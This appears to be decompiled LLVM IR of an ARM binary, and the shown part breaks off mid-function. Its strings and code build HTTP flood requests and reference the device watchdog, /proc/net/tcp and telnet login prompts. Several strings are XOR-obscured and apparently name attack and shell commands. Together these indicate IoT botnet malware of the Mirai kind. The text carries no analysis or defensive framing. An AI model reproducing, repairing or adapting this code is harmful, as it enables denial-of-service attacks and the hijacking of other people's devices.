source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_eb2c.16 = constant i32 -382906384
@global_var_197cc.19 = constant [4 x i8] c"GET\00"
@global_var_197d0.21 = constant i32 47
@global_var_15b6c.24 = constant i32 -449978364
@global_var_197c4.26 = constant i32 32
@global_var_1979c.28 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_197b4.30 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_197c0.32 = constant [3 x i8] c"\0D\0A\00"
@global_var_197d4.34 = constant [9 x i8] c"Cookie: \00"
@global_var_197e0.36 = constant [3 x i8] c"; \00"
@global_var_197ec.38 = constant i32 59
@global_var_197e4.40 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_197f0.42 = constant [5 x i8] c"http\00"
@global_var_197f8.44 = constant [5 x i8] c"url=\00"
@global_var_19800.46 = constant [5 x i8] c"POST\00"
@global_var_19808.48 = constant i32 39
@global_var_12398.49 = constant i32 -439279616
@global_var_1980c.51 = constant i32 61
@global_var_22378.55 = global i32 0
@global_var_a050.56 = constant i32 -352321547
@global_var_137cc.57 = constant i32 -382906384
@global_var_2237c.59 = global i32 0
@global_var_22380.60 = local_unnamed_addr global i32 0
@global_var_22384.61 = local_unnamed_addr global i32 0
@global_var_22388.62 = local_unnamed_addr global i32 0
@global_var_2238c.63 = local_unnamed_addr global i32 0
@global_var_22390.64 = local_unnamed_addr global i32 0
@global_var_22394.65 = local_unnamed_addr global i32 0
@global_var_22398.66 = local_unnamed_addr global i32 0
@global_var_d024.72 = constant i32 -382906384
@global_var_d430.74 = constant i32 -382906384
@global_var_c8ec.76 = constant i32 -382906384
@global_var_c270.78 = constant i32 -382906384
@global_var_bbb8.80 = constant i32 -382906384
@global_var_b420.82 = constant i32 -382906384
@global_var_ae40.84 = constant i32 -382906384
@global_var_a7e4.86 = constant i32 -382906384
@global_var_81cc.88 = constant i32 -382906384
@global_var_2295c.90 = global i32 0
@global_var_22964.101 = global i32 0
@global_var_19810.103 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_2239c.107 = global i32 0
@global_var_22960.109 = global i32 0
@global_var_14e24.111 = constant i32 -382910336
@global_var_e604.112 = constant i32 -509607932
@global_var_eaa8.114 = constant i32 -382910352
@global_var_2233c.116 = global i32 75308
@global_var_22334.118 = global i32 -1
@global_var_2296c.124 = local_unnamed_addr global i32 0
@global_var_2296a.125 = local_unnamed_addr global i32 0
@global_var_19820.128 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_19874.134 = constant [3 x i8] c"/.\00"
@global_var_19850.136 = constant i32 59688
@global_var_e928.137 = constant i32 -382910224
@global_var_11ad8.139 = constant i32 -442552176
@global_var_11b78.142 = constant i32 -382906384
@global_var_11a38.144 = constant i32 -442552176
@global_var_19870.149 = constant i32 59664
@global_var_19844.152 = constant i32 10
@global_var_19830.155 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_223a4.168 = global i32 0
@global_var_223b0.170 = global i32 0
@global_var_223a8.172 = global i32 0
@global_var_223ac.174 = global i32 0
@global_var_19888.180 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_fcc0.190 = constant i32 -509607925
@global_var_22980.192 = global i32 0
@global_var_223e8.194 = global i32 0
@global_var_223b4.196 = global i32 0
@global_var_223e0.198 = global i32 0
@global_var_22978.205 = global i32 0
@global_var_2297c.207 = global i32 0
@global_var_223ba.210 = local_unnamed_addr global i32 0
@global_var_223bc.211 = local_unnamed_addr global i32 0
@global_var_223c0.212 = local_unnamed_addr global i32 0
@global_var_223c1.213 = local_unnamed_addr global i32 0
@global_var_223cc.215 = global i32 0
@global_var_223da.219 = local_unnamed_addr global i32 0
@global_var_198ac.221 = constant [5 x i8] c"PMMV\00"
@global_var_197e8.223 = constant i32 0
@global_var_198b4.225 = constant [6 x i8] c"CFOKL\00"
@global_var_198bc.227 = constant i32 387006810
@global_var_198c4.229 = constant [6 x i8] c"TKXZT\00"
@global_var_198cc.231 = constant i32 437918234
@global_var_198d4.233 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_198dc.235 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_198e8.237 = constant i32 370216979
@global_var_198f0.239 = constant i32 269555223
@global_var_198f8.241 = constant [8 x i8] c"FGDCWNV\00"
@global_var_19900.243 = constant [8 x i8] c"QWRRMPV\00"
@global_var_19908.245 = constant i32 370216979
@global_var_19910.247 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_1991c.249 = constant i32 370216979
@global_var_19924.251 = constant [5 x i8] c"WQGP\00"
@global_var_1992c.253 = constant i32 1263486531
@global_var_199d0.255 = constant i32 320017171
@global_var_19938.257 = constant [9 x i8] c"QOACFOKL\00"
@global_var_19944.259 = constant i32 336860180
@global_var_1994c.261 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_1995c.263 = constant [8 x i8] c"QGPTKAG\00"
@global_var_19964.265 = constant [6 x i8] c"EWGQV\00"
@global_var_1996c.267 = constant [5 x i8] c"W@LV\00"
@global_var_19974.269 = constant i32 324420417
@global_var_19980.271 = constant i32 390551160
@global_var_19988.273 = constant [6 x i8] c"HT@XF\00"
@global_var_19990.275 = constant [5 x i8] c"CLIM\00"
@global_var_19998.277 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_199a0.279 = constant i32 303174162
@global_var_199a8.281 = constant i32 1867011861
@global_var_199b8.283 = constant i32 1263486531
@global_var_199c4.285 = constant [5 x i8] c"RCQQ\00"
@global_var_198e0.287 = constant [5 x i8] c"VGAJ\00"
@global_var_199cc.289 = constant i32 320017171
@global_var_199d8.291 = constant i32 323043395
@global_var_199e0.293 = constant i32 1118227
@global_var_199e4.295 = constant i32 370216979
@global_var_199ec.297 = constant [4 x i8] c"CFO\00"
@global_var_199f0.299 = constant i32 1263421261
@global_var_199fc.301 = constant [7 x i8] c"QUKVAJ\00"
@global_var_19a04.303 = constant [7 x i8] c"VGNLGV\00"
@global_var_19a0c.305 = constant i32 370216979
@global_var_19a18.307 = constant i32 370216979
@global_var_19a24.309 = constant [7 x i8] c"FCGOML\00"
@global_var_19a2c.311 = constant i32 387007823
@global_var_19a34.313 = constant [7 x i8] c"OGPNKL\00"
@global_var_19a3c.315 = constant [9 x i8] c"MRGPCVMP\00"
@global_var_19a48.317 = constant [9 x i8] c"rNAOqRkR\00"
@global_var_223c4.318 = local_unnamed_addr global i32 0
@global_var_223c8.319 = local_unnamed_addr global i32 0
@global_var_223c2.320 = local_unnamed_addr global i32 0
@global_var_223d0.322 = local_unnamed_addr global i32 0
@global_var_223dc.323 = local_unnamed_addr global i32 0
@global_var_fdc0.325 = constant i32 -382910352
@global_var_19a5c.328 = constant [5 x i8] c"ogin\00"
@global_var_19a64.330 = constant [8 x i8] c"assword\00"
@global_var_19a75.332 = constant i32 1377827839
@global_var_19a6c.334 = constant i32 2095871
@global_var_19a54.339 = constant [6 x i8] c"enter\00"
@global_var_22988.341 = global i32 0
@global_var_22344.344 = global i32 -559038737
@global_var_19a78.348 = constant [19 x i8] c"RKAGQVJGEMCVEE\0CON\22\00"
@global_var_229a0.350 = local_unnamed_addr global i32 0
@global_var_229a4.351 = local_unnamed_addr global i32 0
@global_var_19a8c.353 = constant [3 x i8] c"\225\00"
@global_var_229a8.354 = local_unnamed_addr global i32 0
@global_var_229ac.355 = local_unnamed_addr global i32 0
@global_var_22a1c.356 = local_unnamed_addr global i32 0
@global_var_22a18.357 = local_unnamed_addr global i32 0
@global_var_19a90.359 = constant i32 51097
@global_var_22a20.360 = local_unnamed_addr global i32 0
@global_var_22a24.361 = local_unnamed_addr global i32 0
@global_var_19a94.363 = constant i32 1448168270
@global_var_22998.364 = local_unnamed_addr global i32 0
@global_var_2299c.365 = local_unnamed_addr global i32 0
@global_var_19aa4.367 = constant i32 1381389898
@global_var_229b4.368 = local_unnamed_addr global i32 0
@global_var_229b0.369 = local_unnamed_addr global i32 0
@global_var_19ac4.371 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_229b8.372 = local_unnamed_addr global i32 0
@global_var_229bc.373 = local_unnamed_addr global i32 0
@global_var_19acc.375 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_229c0.376 = local_unnamed_addr global i32 0
@global_var_229c4.377 = local_unnamed_addr global i32 0
@global_var_19ad4.379 = constant i32 1195772418
@global_var_229c8.380 = local_unnamed_addr global i32 0
@global_var_229cc.381 = local_unnamed_addr global i32 0
@global_var_19ae0.383 = constant [5 x i8] c"\0DDF\22\00"
@global_var_229d4.384 = local_unnamed_addr global i32 0
@global_var_229d0.385 = local_unnamed_addr global i32 0
@global_var_19ae8.387 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_229d8.388 = local_unnamed_addr global i32 0
@global_var_229dc.389 = local_unnamed_addr global i32 0
@global_var_19af0.391 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_229e0.392 = local_unnamed_addr global i32 0
@global_var_229e4.393 = local_unnamed_addr global i32 0
@global_var_19afc.395 = constant i32 1836214128
@global_var_229e8.396 = local_unnamed_addr global i32 0
@global_var_229ec.397 = local_unnamed_addr global i32 0
@global_var_19b0c.399 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_229f0.400 = local_unnamed_addr global i32 0
@global_var_229f4.401 = local_unnamed_addr global i32 0
@global_var_19b18.403 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_229f8.404 = local_unnamed_addr global i32 0
@global_var_229fc.405 = local_unnamed_addr global i32 0
@global_var_19b24.407 = constant i32 437738110
@global_var_22a04.408 = local_unnamed_addr global i32 0
@global_var_22a00.409 = local_unnamed_addr global i32 0
@global_var_19b48.411 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_22a08.412 = local_unnamed_addr global i32 0
@global_var_22a0c.413 = local_unnamed_addr global i32 0
@global_var_19b54.415 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_22a10.416 = local_unnamed_addr global i32 0
@global_var_22a14.417 = local_unnamed_addr global i32 0
@global_var_19b60.419 = constant [7 x i8] c"QJGNN\22\00"
@global_var_22a28.420 = local_unnamed_addr global i32 0
@global_var_22a2c.421 = local_unnamed_addr global i32 0
@global_var_19b68.423 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_22a30.424 = local_unnamed_addr global i32 0
@global_var_22a34.425 = local_unnamed_addr global i32 0
@global_var_19b70.427 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_22a38.428 = local_unnamed_addr global i32 0
@global_var_22a3c.429 = local_unnamed_addr global i32 0
@global_var_19b78.431 = constant [4 x i8] c"QJ\22\00"
@global_var_22a44.432 = local_unnamed_addr global i32 0
@global_var_22a40.433 = local_unnamed_addr global i32 0
@global_var_19b7c.435 = constant i32 1280000013
@global_var_22a48.436 = local_unnamed_addr global i32 0
@global_var_22a4c.437 = local_unnamed_addr global i32 0
@global_var_19b90.439 = constant i32 1668311919
@global_var_22a54.440 = local_unnamed_addr global i32 0
@global_var_22a50.441 = local_unnamed_addr global i32 0
@global_var_19bac.443 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_22a58.444 = local_unnamed_addr global i32 0
@global_var_22a5c.445 = local_unnamed_addr global i32 0
@global_var_19bb8.447 = constant i32 1280000013
@global_var_22a60.448 = local_unnamed_addr global i32 0
@global_var_22a64.449 = local_unnamed_addr global i32 0
@global_var_19bcc.451 = constant i32 1280000013
@global_var_22a68.452 = local_unnamed_addr global i32 0
@global_var_22a6c.453 = local_unnamed_addr global i32 0
@global_var_19be4.455 = constant i32 1464693110
@global_var_22a74.456 = local_unnamed_addr global i32 0
@global_var_22a70.457 = local_unnamed_addr global i32 0
@global_var_19bfc.459 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_22a78.460 = local_unnamed_addr global i32 0
@global_var_22a7c.461 = local_unnamed_addr global i32 0
@global_var_19c10.463 = constant i32 1196376908
@global_var_22a80.464 = local_unnamed_addr global i32 0
@global_var_22a84.465 = local_unnamed_addr global i32 0
@global_var_19c20.467 = constant i32 1280068961
@global_var_22a88.468 = local_unnamed_addr global i32 0
@global_var_19c38.470 = constant i32 1195458915
@global_var_22a90.471 = local_unnamed_addr global i32 0
@global_var_19c8c.473 = constant i32 1195458915
@global_var_22a98.474 = local_unnamed_addr global i32 0
@global_var_19cb0.476 = constant i32 1447841121
@global_var_22aa0.477 = local_unnamed_addr global i32 0
@global_var_19ce4.479 = constant i32 1633044305
@global_var_22aa8.480 = local_unnamed_addr global i32 0
@global_var_19cf4.482 = constant i32 1346651984
@global_var_22ab0.483 = local_unnamed_addr global i32 0
@global_var_19d00.485 = constant i32 1128353102
@global_var_22ab8.486 = local_unnamed_addr global i32 0
@global_var_19d0c.488 = constant i32 257312593
@global_var_22ac0.489 = local_unnamed_addr global i32 0
@global_var_19d1c.491 = constant i32 1447841089
@global_var_22ac8.492 = local_unnamed_addr global i32 0
@global_var_19d30.494 = constant i32 1279479894
@global_var_22ad0.495 = local_unnamed_addr global i32 0
@global_var_19d44.497 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_22ad8.498 = local_unnamed_addr global i32 0
@global_var_19c2c.500 = constant i32 1380403017
@global_var_22ae0.501 = local_unnamed_addr global i32 0
@global_var_19d50.503 = constant i32 1280068929
@global_var_22ae8.504 = local_unnamed_addr global i32 0
@global_var_19d60.506 = constant i32 1414547281
@global_var_22af0.507 = local_unnamed_addr global i32 0
@global_var_19d74.509 = constant i32 1414547281
@global_var_22af8.510 = local_unnamed_addr global i32 0
@global_var_19d90.512 = constant i32 1264078191
@global_var_22b00.513 = local_unnamed_addr global i32 0
@global_var_19e00.515 = constant i32 1264078191
@global_var_22b08.516 = local_unnamed_addr global i32 0
@global_var_19e70.518 = constant i32 1264078191
@global_var_22b10.519 = local_unnamed_addr global i32 0
@global_var_19ee0.521 = constant i32 1264078191
@global_var_22b18.522 = local_unnamed_addr global i32 0
@global_var_19f50.524 = constant i32 1264078191
@global_var_22b20.525 = local_unnamed_addr global i32 0
@global_var_2281c.527 = global i32 0
@global_var_22b3c.530 = local_unnamed_addr global i32 0
@global_var_22b28.532 = local_unnamed_addr global i32 0
@global_var_22b60.534 = local_unnamed_addr global i32 0
@global_var_22b44.535 = local_unnamed_addr global i32 0
@global_var_223ec.537 = global i32 0
@global_var_223f0.539 = global i32 0
@global_var_19fc8.542 = constant [10 x i8] c"/dev/null\00"
@global_var_22b34.544 = local_unnamed_addr global i32 0
@global_var_22300.547 = global i32 33036
@global_var_22304.549 = global i32 32968
@global_var_12ee4.550 = constant i32 -352321519
@global_var_12f94.557 = constant i32 -450007036
@global_var_22b38.560 = local_unnamed_addr global i32 0
@global_var_22408.562 = global i32 0
@global_var_2240c.564 = global i32 0
@global_var_22810.570 = global i32 0
@global_var_22814.574 = global i32 0
@global_var_19fd2.578 = constant i32 35062016
@global_var_223fc.580 = global i32 0
@global_var_223f8.582 = global i32 0
@global_var_22400.583 = global i32 0
@global_var_14640.588 = constant i32 -516948194
@global_var_14b54.599 = constant i32 -450007036
@global_var_14cb0.601 = constant i32 -509607923
@global_var_19ffc.604 = constant i32 -1
@global_var_19ff4.606 = constant i32 2147483647
@global_var_157dc.609 = constant i32 -449978364
@global_var_22818.613 = global i32 0
@global_var_1a004.615 = constant [10 x i8] c"LINUX_2.6\00"
@global_var_1a010.617 = constant [21 x i8] c"__vdso_clock_gettime\00"
@global_var_15aa4.619 = constant i32 -382910336
@global_var_22348.624 = global i32 0
@global_var_15cf4.625 = constant i32 -484573183
@global_var_2234c.628 = global i32 0
@global_var_15d48.629 = constant i32 -509595648
@global_var_22350.631 = global i32 0
@global_var_15dbc.632 = constant i32 -300085392
@global_var_22b64.634 = global i32 0
@global_var_22b70.635 = local_unnamed_addr global i32 0
@global_var_22b68.636 = local_unnamed_addr global i32 0
@global_var_22b6c.638 = local_unnamed_addr global i32 0
@global_var_22b40.640 = local_unnamed_addr global i32 0
@global_var_22820.642 = global i32 0
@global_var_22b48.644 = global i32 0
@global_var_1a032.646 = constant i32 -1
@global_var_1a031.648 = constant i32 -1
@global_var_1a028.650 = constant i32 67240192
@global_var_2293c.655 = global i32 0
@global_var_22938.658 = global i32 0
@global_var_22944.660 = global i32 0
@global_var_22b30.663 = local_unnamed_addr global i32 0
@global_var_22940.665 = global i32 0
@global_var_17380.685 = constant i32 -382910352
@global_var_2294c.687 = global i32 0
@global_var_22954.690 = global i32 0
@global_var_22950.693 = global i32 0
@global_var_2230c.695 = global i32 0
@global_var_22358.3 = external global i8*
@global_var_22374.53 = external global i8*
@global_var_22375.70 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_22340.120 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_22968.123 = global i16* null
@global_var_223e4.200 = global i16* null
@global_var_223b8.209 = external global i8*
@global_var_223d8.216 = local_unnamed_addr global i8 0
@global_var_223ce.217 = local_unnamed_addr global i16 0
@global_var_223d9.218 = local_unnamed_addr global i8 0
@global_var_22b2c.529 = external global i8*

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_80b4() local_unnamed_addr {
entry:
  %v3_80b4 = load i32, i32* @r0, align 4
  ret i32 %v3_80b4
}

define i32 @function_80c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80c8 = load i32, i32* @r4, align 4
  store i32 %v3_80c8, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_22358.3 to i32), i32* %r4.global-to-local, align 4
  %v2_80d0 = load i8, i8* bitcast (i8** @global_var_22358.3 to i8*), align 4
  %v2_80d4 = icmp eq i8 %v2_80d0, 0
  br i1 %v2_80d4, label %dec_label_pc_80dc, label %dec_label_pc_80f8

dec_label_pc_80dc:                                ; preds = %entry
  store i1 true, i1* @cpsr_z, align 1
  %v3_80ec = call i32 @function_8104()
  %v2_80f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_80f4 = inttoptr i32 %v2_80f4 to i8*
  store i8 1, i8* %v3_80f4, align 1
  %v2_80f8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80f8

dec_label_pc_80f8:                                ; preds = %entry, %dec_label_pc_80dc
  %v2_80f8 = phi i32 [ %v2_80f8.pre, %dec_label_pc_80dc ], [ %v3_80c8, %entry ]
  %.0 = phi i32 [ %v3_80ec, %dec_label_pc_80dc ], [ undef, %entry ]
  store i32 %v2_80f8, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i8** @global_var_22358.3, { 1, 0 }
  uselistorder label %dec_label_pc_80f8, { 1, 0 }
}

define i32 @function_8104() local_unnamed_addr {
dec_label_pc_8104:
  %v0_8108 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8108, label %bb, label %bb3

bb:                                               ; preds = %dec_label_pc_8104
  %v1_8108 = load i32, i32* @r2, align 4
  %v4_8108 = inttoptr i32 %v1_8108 to i32*
  store i32 %v1_8108, i32* %v4_8108, align 4
  br label %bb3

bb3:                                              ; preds = %bb, %dec_label_pc_8104
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8130 = load i32, i32* inttoptr (i32 140040 to i32*), align 8
  %v2_8134 = icmp eq i32 %v2_8130, 0
  br i1 %v2_8134, label %dec_label_pc_814c, label %dec_label_pc_813c

dec_label_pc_813c:                                ; preds = %bb3
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_814c

dec_label_pc_814c:                                ; preds = %bb3, %dec_label_pc_813c
  ret i32 140040

; uselistorder directives
  uselistorder i32 %v1_8108, { 1, 0 }
  uselistorder label %dec_label_pc_814c, { 1, 0 }
}

define i32 @entry_point() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v3_8188 = call i32 @function_8190(i32* nonnull %stack_var_0, i32 0)
  ret i32 %v3_8188
}

define i32 @function_8190(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8190:
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_8190 = load i32, i32* @lr, align 4
  %v2_81a0 = load i32, i32* %arg1, align 4
  %v1_81a4 = add i32 %tmp, 4
  %v7_81bc = inttoptr i32 %v1_81a4 to i32*
  %v8_81bc = call i32 @function_12d00(i32 ptrtoint (i32* @global_var_eb2c.16 to i32), i32 %v2_81a0, i32* %v7_81bc, i32 32948, i32 104312, i32 0, i32 %v0_8190)
  ret i32 %v8_81bc
}

define i32 @function_81cc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_81cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-10572 = alloca i32, align 4
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-20813 = alloca i32, align 4
  %v3_81cc = load i32, i32* @r4, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_81f8 = inttoptr i32 %arg4 to i32*
  %v6_81f8 = call i32 @function_9f04(i32 %arg3, i32* %v5_81f8, i32 21, i32 0, i32 %arg2)
  %v0_81fc = load i32, i32* @r5, align 4
  store i32 %v0_81fc, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  %v0_8208 = load i32, i32* @r4, align 4
  store i32 %v0_8208, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32), i32* %r3.global-to-local, align 4
  %v6_8210 = inttoptr i32 %v0_81fc to i32*
  %v7_8210 = call i32 @function_9f04(i32 %v0_8208, i32* %v6_8210, i32 20, i32 ptrtoint ([4 x i8]* @global_var_197cc.19 to i32), i32 %v6_81f8)
  %v0_8214 = load i32, i32* @r5, align 4
  store i32 %v0_8214, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v7_8210, i32* @sl, align 4
  %v0_8224 = load i32, i32* @r4, align 4
  store i32 %v0_8224, i32* %r0.global-to-local, align 4
  %v5_8228 = inttoptr i32 %v0_8214 to i32*
  %v6_8228 = call i32 @function_9f04(i32 %v0_8224, i32* %v5_8228, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_822c = load i32, i32* @r5, align 4
  store i32 %v0_822c, i32* %r1.global-to-local, align 4
  store i32 %v6_8228, i32* @r8, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8238 = load i32, i32* @r4, align 4
  store i32 %v0_8238, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_197d0.21 to i32), i32* %r3.global-to-local, align 4
  %v5_8240 = inttoptr i32 %v0_822c to i32*
  %v6_8240 = call i32 @function_9f04(i32 %v0_8238, i32* %v5_8240, i32 22, i32 ptrtoint (i32* @global_var_197d0.21 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8244 = load i32, i32* @r5, align 4
  store i32 %v0_8244, i32* %r1.global-to-local, align 4
  store i32 %v6_8240, i32* @r7, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8250 = load i32, i32* @r4, align 4
  store i32 %v0_8250, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8258 = inttoptr i32 %v0_8244 to i32*
  %v5_8258 = call i32 @function_a430(i32 %v0_8250, i32* %v4_8258, i32 24, i32 1)
  %v0_825c = load i32, i32* @r5, align 4
  store i32 %v0_825c, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8258, i32* @r6, align 4
  %v0_826c = load i32, i32* @r4, align 4
  store i32 %v0_826c, i32* %r0.global-to-local, align 4
  %v4_8270 = inttoptr i32 %v0_825c to i32*
  %v5_8270 = call i32 @function_a430(i32 %v0_826c, i32* %v4_8270, i32 7, i32 80)
  %v2_8278 = ptrtoint i32* %stack_var_-20813 to i32
  store i32 %v2_8278, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_828c = urem i32 %v5_8270, 65536
  store i32 %v3_828c, i32* %r3.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_829c = bitcast i32* %stack_var_-20813 to i8*
  %v4_829c = call i32 @function_15594(i8* %v3_829c, i32 0, i32 10241)
  store i32 %v4_829c, i32* %r0.global-to-local, align 4
  %v0_82a0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_82a0 = icmp eq i32 %v0_82a0, 0
  store i1 %v2_82a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a0, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_81cc
  %v1_82a4 = load i32, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_82a4 = icmp eq i32 %v1_82a4, 0
  store i1 %v3_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a4, label %bb157, label %dec_label_pc_82c4

.thread13:                                        ; preds = %dec_label_pc_81cc
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

bb157:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b4

dec_label_pc_82b4:                                ; preds = %bb157, %dec_label_pc_82e4, %.thread13, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v1_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v4_829c, %.thread13 ], [ %v4_829c, %bb157 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  store i32 %v3_81cc, i32* %r4.global-to-local, align 4
  ret i32 %v1_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a0, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a0 to i8*
  %v2_82c8 = call i32 @function_12370(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b4, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* @r8, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @function_12370(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b4, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* @sl, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @function_12370(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
